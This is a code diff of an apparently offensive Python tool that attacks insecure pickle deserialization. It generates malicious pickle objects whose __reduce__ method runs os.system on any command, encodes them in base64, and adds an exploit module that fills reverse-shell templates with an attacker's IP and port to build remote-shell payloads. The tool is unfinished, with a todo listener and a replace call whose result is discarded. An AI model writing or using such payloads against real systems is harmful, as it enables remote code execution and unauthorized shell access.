@@ -123,14 +123,20 @@ def verify():
 
 
 
-def generate_payload(): # todo: nadodati na postojeci pickle objekt
+def generate_payload(revshell_cmd=None): # todo: nadodati na postojeci pickle objekt
     print("[+] Using generate-payload module")
 
     cmd = None
-    if g_args.cmd:
-        cmd = g_args.cmd
+
+    # if generate_payload is not called from exploit functionality
+    # read user provided argument, else use provided revshell_cmd arg
+    if not revshell_cmd:
+        if g_args.cmd:
+            cmd = g_args.cmd
+        else:
+            cmd = input("[+] Enter your command: ")
     else:
-        cmd = input("[+] Enter your command: ")
+        cmd = revshell_cmd
 
     class exploit():
         def __init__(self, command):
@@ -138,9 +144,12 @@ def generate_payload(): # todo: nadodati na postojeci pickle objekt
         def __reduce__(self):
             return os.system, (self.command,)
 
-    print("[+] Generating payload ... ")
-    print("\t[+] Base64 encoded payload: ", base64.b64encode(pickle.dumps(exploit(cmd))).decode("utf-8"))
-    print("\t[+] Raw bytes payload: ", pickle.dumps(exploit(cmd)))
+    # if called from exploit functionality no need to print payload
+    if revshell_cmd is None:
+        print("[+] Generating payload ... ")
+        print("\t[+] Base64 encoded payload: ", base64.b64encode(pickle.dumps(exploit(cmd))).decode("utf-8"))
+        print("\t[+] Raw bytes payload: ", pickle.dumps(exploit(cmd)))
+    return base64.b64encode(pickle.dumps(exploit(cmd))).decode("utf-8")
 
 
 
@@ -150,6 +159,16 @@ def confirm_vuln():
 
 def exploit():
     print("[+] Using exploit module")
+
+    revshell_ip = input("[+] Enter your ip(LHOST): ")
+    revshell_port = input("[+] Enter you (LPORT): ")
+    print(f"[+] Starting listener on {revshell_ip}:{revshell_port}")
+    #todo
+
+    for rs in utils.reverse_shells:
+        rs.replace("ip_placeholder", revshell_ip).replace("port_placeholder", revshell_port).strip()
+        payload = generate_payload(revshell_cmd=rs)
+
 
 def print_banner():
     print(utils.banner)
